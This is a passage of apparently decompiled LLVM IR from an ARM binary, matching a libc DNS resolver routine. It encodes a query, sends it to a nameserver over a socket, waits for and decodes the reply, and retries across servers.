  %v0_18e8c = load i32, i32* @r7, align 4
  %v1_18e8c = load i32, i32* @r5, align 4
  %v2_18e8c = add i32 %v1_18e8c, %v0_18e8c
  %v1_18e90 = sub i32 512, %v1_18e8c
  %v8_18e98 = call i32 @__encode_question(i32* nonnull %stack_var_-56, i32 %v2_18e8c, i32 %v1_18e90, i32 %arg2, i32 %v2_18e7c, i32 %arg2, i32 1)
  store i32 %v8_18e98, i32* @fp, align 4
  %v1_18e9c = icmp slt i32 %v8_18e98, 0
  br i1 %v1_18e9c, label %dec_label_pc_193a8, label %dec_label_pc_18ea4

dec_label_pc_18ea4:                               ; preds = %dec_label_pc_18e60
  store i32 0, i32* @r4, align 4
  %v0_18eb4 = load i32, i32* @r6, align 4
  store i8 2, i8* %stack_var_-100, align 1
  %v3_18ec0 = inttoptr i32 %v0_18eb4 to i8*
  %v4_18ec0 = call i32 @inet_pton(i32 10, i8* %v3_18ec0, i32 %v2_18eac)
  %v1_18ec4 = load i32, i32* @r4, align 4
  %v7_18ec8 = icmp sgt i32 %v4_18ec0, %v1_18ec4
  br i1 %v7_18ec8, label %bb201, label %dec_label_pc_18ea4..thread11_crit_edge

dec_label_pc_18ea4..thread11_crit_edge:           ; preds = %dec_label_pc_18ea4
  %v3_18ed4.pre = load i8, i8* %stack_var_-100, align 1
  br label %.thread11

bb201:                                            ; preds = %dec_label_pc_18ea4
  store i8 10, i8* %stack_var_-100, align 1
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_18ea4..thread11_crit_edge, %bb201
  %v3_18ed4 = phi i8 [ %v3_18ed4.pre, %dec_label_pc_18ea4..thread11_crit_edge ], [ 10, %bb201 ]
  %v4_18ed4 = sext i8 %v3_18ed4 to i32
  %v8_18ed0.op = urem i32 %v1_18ec4, 256
  %v8_18ed0.op.op = mul nuw nsw i32 %v8_18ed0.op, 256
  %v4_18edc = select i1 %v7_18ec8, i32 %v8_18ed0.op.op, i32 0
  %v5_18edc = or i32 %v4_18ed4, %v4_18edc
  %v7_18ee0 = icmp eq i32 %v5_18edc, 10
  br i1 %v7_18ee0, label %dec_label_pc_18f0c, label %dec_label_pc_18ef4

dec_label_pc_18ef4:                               ; preds = %.thread11
  %v0_18ef8 = load i32, i32* @r6, align 4
  store i32 %v0_18ef8, i32* @r0, align 4
  %v1_18f04 = call i32 @inet_addr(i32 %v0_18ef8)
  br label %dec_label_pc_18f0c

dec_label_pc_18f0c:                               ; preds = %.thread11, %dec_label_pc_18ef4
  %v0_18f20 = call i32 @socket()
  store i32 %v0_18f20, i32* @r0, align 4
  %v1_18f24 = icmp slt i32 %v0_18f20, 0
  br i1 %v1_18f24, label %.thread, label %dec_label_pc_18f3c

.thread:                                          ; preds = %dec_label_pc_18f0c
  br label %dec_label_pc_1938c.backedge

dec_label_pc_1938c.backedge:                      ; preds = %.thread, %.thread13
  %stack_var_-208.5.be = add i32 %stack_var_-208.567, 1
  %tmp293 = icmp ult i32 %stack_var_-208.5.be, 3
  br i1 %tmp293, label %dec_label_pc_18d70, label %dec_label_pc_193a8

dec_label_pc_18f3c:                               ; preds = %dec_label_pc_18f0c
  store i32 %v2_18f3c, i32* @r1, align 4
  store i32 28, i32* @r2, align 4
  %v3_18f44 = call i32 @__libc_connect(i32 %v0_18f20, i32 %v2_18f3c, i32 28)
  %v1_18f48 = icmp slt i32 %v3_18f44, 0
  br i1 %v1_18f48, label %dec_label_pc_18f50, label %dec_label_pc_18f70

dec_label_pc_18f50:                               ; preds = %dec_label_pc_18f3c
  %v0_18f50 = call i32 @__errno_location()
  %v1_18f54 = inttoptr i32 %v0_18f50 to i32*
  %v2_18f54 = load i32, i32* %v1_18f54, align 4
  %v7_18f58 = icmp eq i32 %v2_18f54, 101
  br i1 %v7_18f58, label %dec_label_pc_192bc, label %.thread13

.thread13:                                        ; preds = %dec_label_pc_18f50
  br label %dec_label_pc_1938c.backedge

dec_label_pc_18f70:                               ; preds = %dec_label_pc_18f3c
  %v0_18f70 = load i32, i32* @r5, align 4
  %v1_18f70 = load i32, i32* @fp, align 4
  %v2_18f70 = add i32 %v1_18f70, %v0_18f70
  store i32 %v2_18f70, i32* @r2, align 4
  %v0_18f74 = load i32, i32* @r7, align 4
  store i32 %v0_18f74, i32* @r1, align 4
  store i32 0, i32* @r3, align 4
  store i32 %v0_18f20, i32* @r0, align 4
  %v4_18f80 = call i32 @__libc_send(i32 %v0_18f20, i32 %v0_18f74, i32 %v2_18f70, i32 0)
  store i32 0, i32* @r4, align 4
  store i32 %v0_18f20, i32* %stack_var_-44, align 4
  %v4_18fa8 = call i32 @__libc_poll(%pollfd* %v3_18fa8, i32 1, i32 10000)
  %v1_18fac = load i32, i32* @r4, align 4
  %v7_18fb0 = icmp sgt i32 %v4_18fa8, %v1_18fac
  br i1 %v7_18fb0, label %dec_label_pc_18fb4, label %dec_label_pc_192bc

dec_label_pc_18fb4:                               ; preds = %dec_label_pc_18f70
  store i32 %v1_18fac, i32* @r3, align 4
  store i32 %v0_18f20, i32* @r0, align 4
  %v0_18fbc = load i32, i32* @r7, align 4
  store i32 %v0_18fbc, i32* @r1, align 4
  store i32 512, i32* @r2, align 4
  %v4_18fc4 = call i32 @__libc_recv(i32 %v0_18f20, i32 %v0_18fbc, i32 512, i32 %v1_18fac)
  store i32 %v4_18fc4, i32* @fp, align 4
  %v7_18fd0 = icmp slt i32 %v4_18fc4, 12
  br i1 %v7_18fd0, label %dec_label_pc_192f0, label %dec_label_pc_18fd4

dec_label_pc_18fd4:                               ; preds = %dec_label_pc_18fb4
  %v0_18fd4 = load i32, i32* @r7, align 4
  %v2_18fdc = inttoptr i32 %v0_18fd4 to i8*
  %v3_18fdc = call i32 @__decode_header(i8* %v2_18fdc, i32 %v2_18d88)
  %v3_18fe0 = load i8, i8* %stack_var_-188, align 1
  %v4_18fe0 = sext i8 %v3_18fe0 to i32
  store i32 %v4_18fe0, i32* @r6, align 4
  %v1_18fe4 = load i32, i32* @sb, align 4
  %v9_18fe4 = icmp eq i32 %v4_18fe0, %v1_18fe4
  br i1 %v9_18fe4, label %dec_label_pc_18fec, label %dec_label_pc_192f0

dec_label_pc_18fec:                               ; preds = %dec_label_pc_18fd4
  %v1_18ff0 = load i32, i32* @r4, align 4
  %v9_18ff0 = icmp eq i32 %tmp157, %v1_18ff0
  br i1 %v9_18ff0, label %dec_label_pc_192f0, label %dec_label_pc_18ff8

dec_label_pc_18ff8:                               ; preds = %dec_label_pc_18fec
  br i1 %v7_18ffc, label %dec_label_pc_19004, label %dec_label_pc_19080

dec_label_pc_19004:                               ; preds = %dec_label_pc_18ff8
  %v9_19008 = icmp eq i32 %., %v1_18ff0
  br i1 %v9_19008, label %dec_label_pc_19010, label %dec_label_pc_19074

dec_label_pc_19010:                               ; preds = %dec_label_pc_19004
  store i32 %v2_18cec, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_2abe0.674 to i32), i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 %v2_18cec, i32* @r0, align 4
  %v1_19028 = call i32 @__pthread_cleanup_push_defer()
  %v2_19038 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2abe0.674 to i32))
  store i32 %v2_18cec, i32* @r0, align 4
  %v2_19044 = load i32, i32* @global_var_2f654.930, align 4
  store i32 %v2_19044, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i32 102488, i32* @lr, align 4
  %v1_19054 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1905c = load i32, i32* @r4, align 4
  %v1_1905c = add i32 %v0_1905c, -1
  store i32 %v1_1905c, i32* @r4, align 4
  %v5_19064 = icmp slt i32 %v6_19350, %v1_1905c
  br i1 %v5_19064, label %.thread19, label %dec_label_pc_19074

.thread19:                                        ; preds = %dec_label_pc_19010
  %v7_19064 = add i32 %v6_19350, 1
  %v6_19068 = load i32, i32* @r6, align 4
  store i32 %v6_19068, i32* @sb, align 4
  br label %dec_label_pc_1938c.outer.backedge

dec_label_pc_19074:                               ; preds = %dec_label_pc_19010, %dec_label_pc_19004
  %v0_19074 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_190a4

dec_label_pc_19080:                               ; preds = %dec_label_pc_18ff8
  br i1 %v2_19080, label %dec_label_pc_19088, label %dec_label_pc_192f0

dec_label_pc_19088:                               ; preds = %dec_label_pc_19080
  br i1 %tmp198, label %dec_label_pc_1909c, label %dec_label_pc_190b4.preheader

dec_label_pc_190b4.preheader:                     ; preds = %dec_label_pc_19088
  store i32 12, i32* @r5, align 4
  br label %dec_label_pc_190b4

dec_label_pc_1909c:                               ; preds = %dec_label_pc_19088
  %v0_1909c = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_190a4

dec_label_pc_190a4:                               ; preds = %dec_label_pc_19074, %dec_label_pc_1909c
  %storemerge4 = phi i32 [ %v0_1909c, %dec_label_pc_1909c ], [ %v0_19074, %dec_label_pc_19074 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_1909c ], [ 1, %dec_label_pc_19074 ]
  %v2_190a4 = inttoptr i32 %storemerge4 to i32*
  store i32 %storemerge, i32* %v2_190a4, align 4
  br label %dec_label_pc_193b8

dec_label_pc_190ac:                               ; preds = %dec_label_pc_190b4
  %v2_190ac = call i32 @__length_question(i32 %v0_190c0, i32 %v0_190bc)
  %v0_190b0 = load i32, i32* @r5, align 4
  %v2_190b0 = add i32 %v0_190b0, %v2_190ac
  store i32 %v2_190b0, i32* @r5, align 4
  %v0_190b8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_190b4

dec_label_pc_190b4:                               ; preds = %dec_label_pc_190b4.preheader, %dec_label_pc_190ac
  %v0_190bc = phi i32 [ 12, %dec_label_pc_190b4.preheader ], [ %v2_190b0, %dec_label_pc_190ac ]
  %v0_190c4 = phi i32 [ 0, %dec_label_pc_190b4.preheader ], [ %v0_190b8.pre, %dec_label_pc_190ac ]
  store i32 %v0_190bc, i32* @r1, align 4
  %v0_190c0 = load i32, i32* @r7, align 4
  store i32 %v0_190c0, i32* @r0, align 4
  %v1_190c4 = add i32 %v0_190c4, 1
  store i32 %v1_190c4, i32* @r4, align 4
  %v5_190c8 = icmp slt i32 %v0_190c4, 1
  br i1 %v5_190c8, label %dec_label_pc_190ac, label %dec_label_pc_190cc

dec_label_pc_190cc:                               ; preds = %dec_label_pc_190b4
  br label %dec_label_pc_19228

dec_label_pc_190e0:                               ; preds = %bb205
  store i32 %v2_190e0, i32* @r4, align 4
  %v0_190e4 = load i32, i32* @r7, align 4
  %v0_190ec = load i32, i32* @fp, align 4
  %v5_190f4 = call i32 @__decode_answer(i32 %v0_190e4, i32 %v0_190e8, i32 %v0_190ec, i32* nonnull %stack_var_-140)
  %v1_190f8 = icmp slt i32 %v5_190f4, 0
  br i1 %v1_190f8, label %dec_label_pc_19104, label %dec_label_pc_19120

dec_label_pc_19104:                               ; preds = %dec_label_pc_190e0
  %v2_19108 = icmp eq i32 %stack_var_-192.0, 0
  br i1 %v2_19108, label %dec_label_pc_192f0, label %dec_label_pc_19110

dec_label_pc_19110:                               ; preds = %dec_label_pc_19104
  br i1 %v2_19114, label %dec_label_pc_192f0, label %dec_label_pc_1923c

dec_label_pc_19120:                               ; preds = %dec_label_pc_190e0
  %v2_19124 = icmp eq i32 %stack_var_-212.2, 0
  br i1 %v2_19124, label %dec_label_pc_191c8, label %dec_label_pc_1912c

dec_label_pc_1912c:                               ; preds = %dec_label_pc_19120
  %v0_1912c = load i32, i32* @r8, align 4
  %v6_19130 = add i32 %v0_1912c, 36
  %v7_19130 = inttoptr i32 %v6_19130 to i32*
  %v8_19130 = load i32, i32* %v7_19130, align 4
  store i32 %v8_19130, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v2_190e0, i32* @r1, align 4
  store i32 %v0_1912c, i32* @r0, align 4
  %v0_1914c = call i32 @memcpy()
  %v0_19150 = load i32, i32* @r8, align 4
  %v1_19150 = add i32 %v0_19150, 4
  %v2_19150 = inttoptr i32 %v1_19150 to i32*
  %v3_19150 = load i32, i32* %v2_19150, align 4
  %v7_19154 = icmp eq i32 %v3_19150, 24
  br i1 %v7_19154, label %dec_label_pc_19178, label %dec_label_pc_1915c

dec_label_pc_1915c:                               ; preds = %dec_label_pc_1912c
  %v1_1915c = add i32 %v0_19150, 28
  %v2_1915c = inttoptr i32 %v1_1915c to i32*
  %v3_1915c = load i32, i32* %v2_1915c, align 4
  %v2_19160 = icmp eq i32 %v3_1915c, 0
  br i1 %v2_19160, label %dec_label_pc_1923c, label %dec_label_pc_19168

dec_label_pc_19168:                               ; preds = %dec_label_pc_1915c
  br i1 %v7_1916c, label %dec_label_pc_19178, label %bb203

bb203:                                            ; preds = %dec_label_pc_19168
  br i1 %v8_19170, label %dec_label_pc_19178, label %dec_label_pc_1923c

dec_label_pc_19178:                               ; preds = %dec_label_pc_19168, %bb203, %dec_label_pc_1912c
  %v9_1917c = icmp eq i32 %v3_19150, %arg2
  br i1 %v9_1917c, label %dec_label_pc_19190, label %dec_label_pc_19184

dec_label_pc_19184:                               ; preds = %dec_label_pc_19178
  %v1_19184 = inttoptr i32 %v0_19150 to i32*
  %v2_19184 = load i32, i32* %v1_19184, align 4
  store i32 %v2_19184, i32* @r0, align 4
  %v0_19188 = call i32 @free()
  br label %dec_label_pc_19214

dec_label_pc_19190:                               ; preds = %dec_label_pc_19178
  %v1_19198 = add i32 %v0_19150, 16
  %v2_19198 = inttoptr i32 %v1_19198 to i32*
  %v3_19198 = load i32, i32* %v2_19198, align 4
  %v2_1919c = sub i32 %tmp155, %stack_var_-192.0
  %v1_191a0 = add i32 %v2_1919c, -1
  %v1_191a4 = add i32 %v3_19198, 4
  %v2_191a8 = mul i32 %v1_191a4, %v1_191a0
  %v1_191ac = add i32 %v0_19150, 32
  %v2_191ac = inttoptr i32 %v1_191ac to i32*
  %v3_191ac = load i32, i32* %v2_191ac, align 4
  %v2_191b4 = add i32 %v0_19150, 36
  %v3_191b4 = inttoptr i32 %v2_191b4 to i32*
  store i32 %v1_191a0, i32* %v3_191b4, align 4
  %tmp294 = icmp ugt i32 %v2_191a8, %v3_191ac
  br i1 %tmp294, label %dec_label_pc_1923c, label %dec_label_pc_19190.dec_label_pc_19210_crit_edge

dec_label_pc_19190.dec_label_pc_19210_crit_edge:  ; preds = %dec_label_pc_19190
  %v1_19210.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_19210

dec_label_pc_191c8:                               ; preds = %dec_label_pc_19120
  %v3_191c8 = load i32, i32* %stack_var_-140, align 4
  store i32 %v3_191c8, i32* @r0, align 4
  %v0_191cc = call i32 @free()
  br i1 %v9_191d8, label %dec_label_pc_191e0, label %dec_label_pc_19214

dec_label_pc_191e0:                               ; preds = %dec_label_pc_191c8
  %v0_191e0 = load i32, i32* @r8, align 4
  %v1_191e0 = add i32 %v0_191e0, 16
  %v2_191e0 = inttoptr i32 %v1_191e0 to i32*
  %v3_191e0 = load i32, i32* %v2_191e0, align 4
  %v9_191e8 = icmp eq i32 %v3_191e0, %tmp146
  br i1 %v9_191e8, label %dec_label_pc_191f0, label %dec_label_pc_192e8

dec_label_pc_191f0:                               ; preds = %dec_label_pc_191e0
  %v1_191f0 = add i32 %v0_191e0, 36
  %v2_191f0 = inttoptr i32 %v1_191f0 to i32*
  %v3_191f0 = load i32, i32* %v2_191f0, align 4
  %v1_191f4 = add i32 %v0_191e0, 28
  %v2_191f4 = inttoptr i32 %v1_191f4 to i32*
  %v3_191f4 = load i32, i32* %v2_191f4, align 4
  %v3_191f8 = mul i32 %v3_191f0, %tmp146
  %v4_191f8 = add i32 %v3_191f4, %v3_191f8
  store i32 %v4_191f8, i32* @r0, align 4
  store i32 %tmp146, i32* @r2, align 4
  %v0_19204 = call i32 @memcpy()
  %v0_19208 = load i32, i32* @r8, align 4
  %v1_19208 = add i32 %v0_19208, 36
  %v2_19208 = inttoptr i32 %v1_19208 to i32*
  %v3_19208 = load i32, i32* %v2_19208, align 4
  %v1_1920c = add i32 %v3_19208, 1
  br label %dec_label_pc_19210

dec_label_pc_19210:                               ; preds = %dec_label_pc_19190.dec_label_pc_19210_crit_edge, %dec_label_pc_191f0
  %v1_19210 = phi i32 [ %v0_19208, %dec_label_pc_191f0 ], [ %v1_19210.pre, %dec_label_pc_19190.dec_label_pc_19210_crit_edge ]
  %storemerge5 = phi i32 [ %v1_1920c, %dec_label_pc_191f0 ], [ 0, %dec_label_pc_19190.dec_label_pc_19210_crit_edge ]
  %v2_19210 = add i32 %v1_19210, 36
  %v3_19210 = inttoptr i32 %v2_19210 to i32*
  store i32 %storemerge5, i32* %v3_19210, align 4
  br label %dec_label_pc_19214

dec_label_pc_19214:                               ; preds = %dec_label_pc_191c8, %dec_label_pc_19184, %dec_label_pc_19210
  %stack_var_-212.1 = phi i32 [ 0, %dec_label_pc_19210 ], [ 0, %dec_label_pc_191c8 ], [ %stack_var_-212.2, %dec_label_pc_19184 ]
  %v1_1921c = add i32 %stack_var_-192.0, 1
  %v0_19224 = load i32, i32* @r5, align 4
  %v2_19224 = add i32 %v0_19224, %v5_190f4
  store i32 %v2_19224, i32* @r5, align 4
  br label %dec_label_pc_19228

dec_label_pc_19228:                               ; preds = %dec_label_pc_190cc, %dec_label_pc_19214
  %v0_190e8 = phi i32 [ %v0_190bc, %dec_label_pc_190cc ], [ %v2_19224, %dec_label_pc_19214 ]
  %stack_var_-212.2 = phi i32 [ 1, %dec_label_pc_190cc ], [ %stack_var_-212.1, %dec_label_pc_19214 ]
  %stack_var_-192.0 = phi i32 [ 0, %dec_label_pc_190cc ], [ %v1_1921c, %dec_label_pc_19214 ]
  %v2_19230 = sub i32 %stack_var_-192.0, %tmp155
  %v4_19230 = xor i32 %stack_var_-192.0, %tmp155
  %v5_19230 = xor i32 %v2_19230, %stack_var_-192.0
  %v6_19230 = and i32 %v5_19230, %v4_19230
  %v5_19234 = icmp slt i32 %stack_var_-192.0, %tmp155
  br i1 %v5_19234, label %bb204, label %bb205

bb204:                                            ; preds = %dec_label_pc_19228
  %v7_19234 = load i32, i32* @fp, align 4
  %v8_19234 = sub i32 %v0_190e8, %v7_19234
  %v10_19234 = xor i32 %v7_19234, %v0_190e8
  %v11_19234 = xor i32 %v8_19234, %v0_190e8
  %v12_19234 = and i32 %v11_19234, %v10_19234
  br label %bb205

bb205:                                            ; preds = %dec_label_pc_19228, %bb204
  %v1_19238.in = phi i32 [ %v6_19230, %dec_label_pc_19228 ], [ %v12_19234, %bb204 ]
  %v0_19238.in = phi i32 [ %v2_19230, %dec_label_pc_19228 ], [ %v8_19234, %bb204 ]
  %v0_19238 = icmp slt i32 %v0_19238.in, 0
  %v1_19238 = icmp slt i32 %v1_19238.in, 0
  %v2_19238 = xor i1 %v1_19238, %v0_19238
  br i1 %v2_19238, label %dec_label_pc_190e0, label %dec_label_pc_1923c

dec_label_pc_1923c:                               ; preds = %dec_label_pc_19110, %bb203, %dec_label_pc_19190, %dec_label_pc_1915c, %bb205
  store i32 %v0_18f20, i32* @r0, align 4
  %v1_19240 = call i32 @__libc_close(i32 %v0_18f20)
  %v3_19244 = load i32, i32* %stack_var_0, align 4
  %v2_19248 = icmp eq i32 %v3_19244, 0
  br i1 %v2_19248, label %.thread26, label %bb206

bb206:                                            ; preds = %dec_label_pc_1923c
  %v1_19250 = load i32, i32* @r7, align 4
  %v3_1924c = inttoptr i32 %v3_19244 to i32*
  store i32 %v1_19250, i32* %v3_1924c, align 4
  br label %bb207

.thread26:                                        ; preds = %dec_label_pc_1923c
  br label %bb207

bb207:                                            ; preds = %bb206, %.thread26
  store i32 103000, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_19248, i32 ptrtoint (i32* @global_var_134b0.561 to i32))
  %v2_19258 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_19258, i32* @r0, align 4
  store i32 %v2_18cec, i32* @r4, align 4
  %v0_19260 = call i32 @free()
  store i32 %v2_18cec, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2f4fc.918 to i32), i32* @r2, align 4
  %v1_19278 = call i32 @__pthread_cleanup_push_defer()
  %v2_19288 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2f4fc.918 to i32))
  %v0_19294 = load i32, i32* @r6, align 4
  %v3_19294 = sdiv i32 %v0_19294, 256
  %v0_19298 = load i32, i32* @sl, align 4
  store i32 %v0_19298, i32* @global_var_2f514.923, align 4
  store i32 %v2_18cec, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  %v1_192a4 = trunc i32 %v3_19294 to i8
  store i8 %v1_192a4, i8* @global_var_2abdd.926, align 1
  %v1_192a8 = trunc i32 %v0_19294 to i8
  store i8 %v1_192a8, i8* bitcast (i8** @global_var_2abdc.925 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_192b8.936 to i32), i32* @lr, align 4
  %v1_192b4 = call i32 @__pthread_cleanup_pop_restore()
  %v0_19440.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_19440

dec_label_pc_192bc:                               ; preds = %dec_label_pc_18f50, %dec_label_pc_18f70
  %v0_192bc = load i32, i32* @sl, align 4
  %v1_192bc = add i32 %v0_192bc, 1
  %v2_192c4 = srem i32 %v1_192bc, %arg3
  store i32 %v2_192c4, i32* @sl, align 4
  %v2_192c8 = icmp eq i32 %v2_192c4, 0
  br i1 %v2_192c8, label %dec_label_pc_192d0, label %dec_label_pc_19388.backedge

dec_label_pc_192d0:                               ; preds = %dec_label_pc_192bc
  %v1_192d8 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_1938c.outer.backedge

dec_label_pc_1938c.outer.backedge:                ; preds = %dec_label_pc_192d0, %dec_label_pc_1936c, %.thread19
  %stack_var_-204.1.ph.be = phi i32 [ %v7_19064, %.thread19 ], [ -1, %dec_label_pc_1936c ], [ -1, %dec_label_pc_192d0 ]
  %stack_var_-208.5.ph.be = phi i32 [ %stack_var_-208.567, %.thread19 ], [ %v1_19374, %dec_label_pc_1936c ], [ %v1_192d8, %dec_label_pc_192d0 ]
  %tmp295 = icmp ult i32 %stack_var_-208.5.ph.be, 3
  br i1 %tmp295, label %dec_label_pc_18d70.lr.ph, label %dec_label_pc_193a8

dec_label_pc_192e8:                               ; preds = %dec_label_pc_191e0
  %v1_192e8 = inttoptr i32 %v0_191e0 to i32*
  %v2_192e8 = load i32, i32* %v1_192e8, align 4
  store i32 %v2_192e8, i32* @r0, align 4
  %v0_192ec = call i32 @free()
  br label %dec_label_pc_192f0

dec_label_pc_192f0:                               ; preds = %dec_label_pc_19080, %dec_label_pc_18fd4, %dec_label_pc_19110, %dec_label_pc_19104, %dec_label_pc_18fec, %dec_label_pc_18fb4, %dec_label_pc_192e8
  br i1 %v2_192f4, label %dec_label_pc_192fc, label %dec_label_pc_19358

dec_label_pc_192fc:                               ; preds = %dec_label_pc_192f0
  store i32 %v2_18cec, i32* @r5, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2abe0.674 to i32), i32* @r2, align 4
  store i32 %v2_18cec, i32* @r0, align 4
  %v1_19314 = call i32 @__pthread_cleanup_push_defer()
  %v2_19324 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2abe0.674 to i32))
  store i32 1, i32* @r1, align 4
  %v2_19330 = load i32, i32* @global_var_2f654.930, align 4
  store i32 %v2_19330, i32* @r4, align 4
  store i32 %v2_18cec, i32* @r0, align 4
  store i32 103236, i32* @lr, align 4
  %v1_19340 = call i32 @__pthread_cleanup_pop_restore()
  %v0_19348 = load i32, i32* @r4, align 4
  %v1_19348 = add i32 %v0_19348, -1
  store i32 %v1_19348, i32* @r4, align 4
  %v5_19350 = icmp slt i32 %v6_19350, %v1_19348
  br i1 %v5_19350, label %.thread27, label %dec_label_pc_19358

.thread27:                                        ; preds = %dec_label_pc_192fc
  %v7_19350 = add i32 %v6_19350, 1
  br label %dec_label_pc_19388.backedge

dec_label_pc_19358:                               ; preds = %dec_label_pc_192fc, %dec_label_pc_192f0
  %v0_19358 = load i32, i32* @sl, align 4
  %v1_19358 = add i32 %v0_19358, 1
  %v2_19360 = srem i32 %v1_19358, %arg3
  store i32 %v2_19360, i32* @sl, align 4
  %v2_19364 = icmp eq i32 %v2_19360, 0
  br i1 %v2_19364, label %dec_label_pc_1936c, label %dec_label_pc_19388.backedge

dec_label_pc_1936c:                               ; preds = %dec_label_pc_19358
  %v1_19374 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_1938c.outer.backedge

dec_label_pc_19388.backedge:                      ; preds = %dec_label_pc_192bc, %dec_label_pc_19358, %.thread27
  %storemerge87 = phi i32 [ %v7_19350, %.thread27 ], [ -1, %dec_label_pc_19358 ], [ -1, %dec_label_pc_192bc ]
  %tmp296 = icmp ult i32 %stack_var_-208.567, 3
  br i1 %tmp296, label %dec_label_pc_18d70.lr.ph.preheader, label %dec_label_pc_193a8

dec_label_pc_18d70.lr.ph.preheader:               ; preds = %dec_label_pc_18d70.lr.ph.preheader.lr.ph, %dec_label_pc_19388.backedge
  %stack_var_-216.0261 = phi i32 [ -1, %dec_label_pc_18d70.lr.ph.preheader.lr.ph ], [ %v0_18f20, %dec_label_pc_19388.backedge ]
  %stack_var_-208.4260 = phi i32 [ %v0_18d68, %dec_label_pc_18d70.lr.ph.preheader.lr.ph ], [ %stack_var_-208.567, %dec_label_pc_19388.backedge ]
  %v0_19388259 = phi i32 [ -1, %dec_label_pc_18d70.lr.ph.preheader.lr.ph ], [ %storemerge87, %dec_label_pc_19388.backedge ]
  br label %dec_label_pc_18d70.lr.ph

dec_label_pc_18d70.lr.ph:                         ; preds = %dec_label_pc_18d70.lr.ph.preheader, %dec_label_pc_1938c.outer.backedge
  %stack_var_-216.1.ph84 = phi i32 [ %v0_18f20, %dec_label_pc_1938c.outer.backedge ], [ %stack_var_-216.0261, %dec_label_pc_18d70.lr.ph.preheader ]
  %stack_var_-208.5.ph83 = phi i32 [ %stack_var_-208.5.ph.be, %dec_label_pc_1938c.outer.backedge ], [ %stack_var_-208.4260, %dec_label_pc_18d70.lr.ph.preheader ]
  %v6_19350 = phi i32 [ %stack_var_-204.1.ph.be, %dec_label_pc_1938c.outer.backedge ], [ %v0_19388259, %dec_label_pc_18d70.lr.ph.preheader ]
  %v1_18e18 = icmp slt i32 %v6_19350, 0
  %v4_18e54 = mul i32 %v6_19350, 4
  %v5_18e54 = add i32 %v4_18e54, ptrtoint (i32* @global_var_2f634.934 to i32)
  %v6_18e54 = inttoptr i32 %v5_18e54 to i32*
  br label %dec_label_pc_18d70

dec_label_pc_1939c:                               ; preds = %bb195, %.thread8, %dec_label_pc_18cc8, %dec_label_pc_18cbc
  store i32 -1, i32* @sl, align 4
  store i32 -1, i32* @sb, align 4
  br label %dec_label_pc_193a8

dec_label_pc_193a8:                               ; preds = %dec_label_pc_18cd8, %dec_label_pc_19388.backedge, %dec_label_pc_1938c.outer.backedge, %bb200, %dec_label_pc_18e60, %dec_label_pc_1938c.backedge, %dec_label_pc_1939c
  %stack_var_-216.2 = phi i32 [ -1, %dec_label_pc_1939c ], [ %v0_18f20, %dec_label_pc_1938c.backedge ], [ %v1_18d78, %dec_label_pc_18e60 ], [ %v1_18d78, %bb200 ], [ %v0_18f20, %dec_label_pc_1938c.outer.backedge ], [ -1, %dec_label_pc_18cd8 ], [ %v0_18f20, %dec_label_pc_19388.backedge ]
  %v0_193a8 = call i32 @__GI___h_errno_location()
  %v2_193b0 = inttoptr i32 %v0_193a8 to i32*
  store i32 -1, i32* %v2_193b0, align 4
  %v0_193b4 = load i32, i32* @sb, align 4
  store i32 %v0_193b4, i32* @r6, align 4
  br label %dec_label_pc_193b8

dec_label_pc_193b8:                               ; preds = %dec_label_pc_190a4, %dec_label_pc_193a8
  %v1_193c0 = phi i32 [ %stack_var_-216.2, %dec_label_pc_193a8 ], [ %v0_18f20, %dec_label_pc_190a4 ]
  %v7_193bc = icmp eq i32 %v1_193c0, -1
  br i1 %v7_193bc, label %bb209, label %bb208

bb208:                                            ; preds = %dec_label_pc_193b8
  br label %bb209

bb209:                                            ; preds = %dec_label_pc_193b8, %bb208
  store i32 103368, i32* @lr, align 4
  %v1_193c4 = xor i1 %v7_193bc, true
  call void @__pseudo_cond_branch(i1 %v1_193c4, i32 ptrtoint (i32* @global_var_10018.859 to i32))
  %v2_193c8 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_193c8, i32* @r0, align 4
  %v0_193cc = call i32 @free()
  %v0_193d0 = load i32, i32* @r7, align 4
  store i32 %v0_193d0, i32* @r0, align 4
  %v0_193d4 = call i32 @free()
  %v0_193d8 = load i32, i32* @sl, align 4
  %v7_193d8 = icmp eq i32 %v0_193d8, -1
  br i1 %v7_193d8, label %bb210, label %dec_label_pc_193e4

bb210:                                            ; preds = %bb209
  br label %dec_label_pc_19440

dec_label_pc_193e4:                               ; preds = %bb209
  %v2_193e4 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_193e4, i32* @r4, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2f4fc.918 to i32), i32* @r2, align 4
  store i32 %v2_193e4, i32* @r0, align 4
  %v1_193fc = call i32 @__pthread_cleanup_push_defer()
  %v2_1940c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2f4fc.918 to i32))
  %v0_19418 = load i32, i32* @r6, align 4
  %v3_19418 = sdiv i32 %v0_19418, 256
  %v0_1941c = load i32, i32* @sl, align 4
